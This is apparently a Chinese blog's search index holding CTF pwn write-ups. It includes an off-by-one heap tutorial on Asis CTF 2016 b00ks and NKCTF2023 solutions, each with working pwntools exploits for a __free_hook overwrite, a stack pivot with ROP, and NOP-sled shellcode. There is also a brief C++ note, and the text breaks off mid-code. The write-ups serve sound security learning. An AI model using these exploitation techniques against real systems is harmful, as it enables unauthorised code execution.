<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>堆利用之off-by-one</title>
      <link href="/2023/04/24/dui-li-yong-zhi-off-by-one/"/>
      <url>/2023/04/24/dui-li-yong-zhi-off-by-one/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>off by one往往是由于程序对边界检查不严格而导致多写入一个字节。</p><p>eg：这段代码忽略了strcpy函数最后会写入一个<code>\x00</code>，所以导致写入了25个字节。当然这里也存在栈溢出漏洞。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    chunk1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">24</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h2><p>程序只关闭了canary保护；</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/0.png"></p><p>程序一开始会要求输入author name，然后有6个功能，可以自己走一遍程序流程；</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/1.png"></p><h3 id="程序流程分析"><a href="#程序流程分析" class="headerlink" title="程序流程分析"></a>程序流程分析</h3><p>main函数如下图，函数我都重命名了</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/2.png"></p><p><strong>edit_author_name</strong></p><p>我们进入edit_author_name函数，最开始会调用一遍这个函数也就是让我们输入author name，这个函数调用了sub_9F5函数，我们跟进看看；</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/3.png"></p><p>在edit_author_name函数中sub_9F5被传入off_202018,32两个参数，我们进入sub_9F5函数</p><p>​这里存在off by null漏洞</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/11.png"></p><p><strong>create</strong></p><p>逻辑自己看吧，注释都写了</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/6.png"></p><p>这里sub_B24函数如下：off_202010存放的结构体指针首地址</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/5.png"></p><p>这里很有意思，在create函数中，我们知道了结构体的指针放在off_202010处，而我们在edit_author_name函数中知道了author name存储在off_202018中，并且可以溢出一个字节为NULL字节</p><p>我们在看下off_202010 和 off_202018的位置关系：</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/4.png"></p><p>所以我们可以得到以下内存布局：所以我们可以通过填充author name去覆盖第一个book_ptr的低字节为NULL</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/10.png"></p><p><strong>delete</strong></p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/7.png"></p><p><strong>edit</strong></p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/8.png"></p><p><strong>show</strong></p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/9.png"></p><h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p>先回到这个图吧</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/10.png"></p><ul><li><p>一开始我们写入author name为32个字节</p></li><li><p>然后我们创建两个book，这里对name和des的大小有要求</p><ul><li>对于第一个book，name的大小应该使得des_ptr的低字节为00；这里我的环境计算出name的大小应当为64</li><li>对于第二个book，name和des的大小应该接近top_chunk大小，使得name和des的chunk由mmp分配</li></ul></li><li><p>当我们创建完book后，这是我们show的话，第一个book的book_ptr也会被输出，原因应该很好理解吧；上个图吧</p></li></ul><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/12.png" alt="13"></p><ul><li>然后我们在edit_author_name去把author修改为32个字节，这时book1_ptr的低字节就会被覆盖为低字节；上个图吧</li></ul><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/13.png"></p><p>这里我们可以查看一下两本书的结构体：</p><p>​我们可以看到book1结构体中des_ptr的值，是不是很熟悉！！！在上面我们把book1_ptr给修改成了des_ptr，那么问题就来了</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/14.png"></p><p>此时内存布局如下：所以我们可以提前在book1中的des中伪造<code>id name_ptr des_ptr des_size</code>，布置的值如下：</p><ul><li>id = 1</li><li>name_ptr 指向 book2的name_ptr</li><li>des_ptr 指向 book2的des_ptr</li><li>des_size = 0xffff</li></ul><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/15.png"></p><p>至于为啥向上面那样伪造的原因如下：伪造完后，内存布局如下：</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/16.png"></p><ul><li>那么我们如果输出book1的name，则会输出book2的name_ptr指针；如果输出book1的des，则会输出book2的des_ptr指针。</li><li>那么我们如果修改book1的des，则会修改book2的des_ptr指针。所以我们可以把book2的des_ptr指针修改为__free_hook<ul><li>那么我们如果在去修改book2的des，那么book2会根据book2的des_ptr指针去修改；因为我们已经把book2的des_ptr指针修改为了__free_hook，所以此时我们就可以把    <code>__free_hook</code>修改为one_gadget</li></ul></li><li>然后在delete即可getshell</li></ul><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/18.png"></p><p>但是我们要获得__free_hook就得泄漏libc，如何泄漏呢？记得我们在上面把book2的name,des的值设置的接近为top_chunk的值吗？这就是为了泄漏libc的？</p><p>因为mmp分配的空间与libc的偏移是固定的，所以只要我们能够泄漏book2的name_ptr的值或者des_ptr的值就可以泄漏libc了；</p><p>那么我们如何泄漏book2的name_ptr或者des_ptr呢？在上面已经给出了方法，就是把book1的name_ptr修改为book2的name_ptr即可？</p><p>而在第一次我们泄漏了book1的book_ptr，我们知道book_ptr中存储的内容为<code>id name_ptr des_ptr des_size</code>，而book1与book2的book_ptr偏移是固定的所以很容易得到book2的name_ptr和des_ptr</p><p><img src="/2023/04/24/dui-li-yong-zhi-off-by-one/17.png"></p><p>这里我没有打通：因为gilbc 2.34已经废除__free_hook了</p><p>而我用glibc 2.23也没有打通，远程环境也没有找到；哎，知道思路就行了</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./pwn'</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'&gt; '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>nameSize<span class="token punctuation">,</span> name<span class="token punctuation">,</span> desSize<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>nameSize<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'chars): '</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>desSize<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'description: '</span><span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'delete: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'edit: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'description: '</span><span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ID: '</span><span class="token punctuation">)</span>        Id <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Name: '</span><span class="token punctuation">)</span>        Name <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Description: '</span><span class="token punctuation">)</span>        Des <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Author: '</span><span class="token punctuation">)</span>        Author <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> Id<span class="token punctuation">,</span> Name<span class="token punctuation">,</span> Des<span class="token punctuation">,</span> Author<span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name: '</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name: '</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">135168</span><span class="token punctuation">,</span> <span class="token string">b'B'</span><span class="token punctuation">,</span> <span class="token number">135168</span><span class="token punctuation">,</span> <span class="token string">b'B'</span><span class="token punctuation">)</span>_<span class="token punctuation">,</span> _<span class="token punctuation">,</span> _<span class="token punctuation">,</span> Author <span class="token operator">=</span> show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>book1 <span class="token operator">=</span> u64<span class="token punctuation">(</span>Author<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"book1:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book1<span class="token punctuation">)</span><span class="token punctuation">)</span>book1_des <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book1<span class="token operator">+</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book1<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> book1_des<span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>_<span class="token punctuation">,</span> book2_name_ptr<span class="token punctuation">,</span> book2_des_ptr<span class="token punctuation">,</span> _ <span class="token operator">=</span> show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>book2_name_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>book2_name_ptr<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>book2_des_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>book2_des_ptr<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"book2_name_addr:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_name_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"book2_des_addr:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_des_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> book2_name_addr <span class="token operator">-</span> <span class="token number">3530768</span><span class="token triple-quoted-string string">"""0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)0xebcf1 execve("/bin/sh", r10, [rbp-0x70])0xebcf5 execve("/bin/sh", r10, rdx)0xebcf8 execve("/bin/sh", rsi, rdx)"""</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xebcf5</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"free_hook:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN堆 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -堆中的off by one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++基础</title>
      <link href="/2023/04/24/c-ji-chu/"/>
      <url>/2023/04/24/c-ji-chu/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="new运算符"><a href="#new运算符" class="headerlink" title="new运算符"></a>new运算符</h1><p><code>new</code>用来在堆区开辟一段空间，这段空间需要程序员自己释放；</p><p>语法：</p><ul><li>一个变量：<code>new 数据类型(数据值)</code>，返回一个对应类型的指针；</li><li>一个数组：<code>new 数据类型[元素个数]</code>，返回一个对应类型的指针。</li></ul><p><code>delete</code>用来释放<code>new</code>开辟的空间；</p><p>语法：</p><ul><li><code>delete 指针名</code>或<code>delete[] 指针名</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDCTF2023-WP</title>
      <link href="/2023/04/24/hdctf2023-wp/"/>
      <url>/2023/04/24/hdctf2023-wp/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nkctf2023-wp</title>
      <link href="/2023/04/22/nkctf2023-wp/"/>
      <url>/2023/04/22/nkctf2023-wp/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><ul><li>前三个函数依次往bss段上写入8个字节，且写入的地址是连续的</li><li>heart函数存在漏洞可以直接输出puts函数的地址，且存在栈溢出，但是只能溢出到ret_addr</li></ul><blockquote><p>栈迁移+ROP：</p><ul><li>利用heart函数泄漏出puts函数地址，从而泄漏libc</li><li>利用前三个函数向bss段上布置好ROP链：pop_rdi_ret；binsh；system.</li><li>最后再利用heart函数栈迁移到bss</li></ul></blockquote><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'&gt; \n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">acm</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"what's your comment?\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ctf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"what's your corment?\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">love</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"what's your corMenT?\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">heart</span><span class="token punctuation">(</span>data<span class="token operator">=</span><span class="token string">b'deadbeef'</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"now, come and read my heart...\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>heart<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' see this. '</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x401573</span>leave_ret <span class="token operator">=</span> <span class="token number">0x040139e</span>ctf<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>acm<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>love<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> <span class="token number">0x4050A0</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0xA</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>heart<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezshellocde"><a href="#ezshellocde" class="headerlink" title="ezshellocde"></a>ezshellocde</h2><ul><li>漏洞见图</li></ul><p><img src="/2023/04/22/nkctf2023-wp/0.png"></p><blockquote><p>1、cdll模拟</p><p>2、nop滑块</p></blockquote><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./pwn"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcdll <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>v6 <span class="token operator">=</span> dll<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#cdll模拟</span><span class="token comment">#payload = b'A'*v6 + shellcode</span><span class="token comment">#nop滑块</span>payload <span class="token operator">=</span> <span class="token string">b'\x90'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> shellcode<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'min!\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="9961code"><a href="#9961code" class="headerlink" title="9961code"></a>9961code</h2><ul><li>shellcode长度限制小于0x16</li></ul><p><img src="/2023/04/22/nkctf2023-wp/1.png"></p><p>可以看到最后的JUMPOUT逻辑，r15的值就是0x9961000</p><p><img src="/2023/04/22/nkctf2023-wp/2.png"></p><p>exp1：</p><ul><li>shellocde长度小于0x16</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn 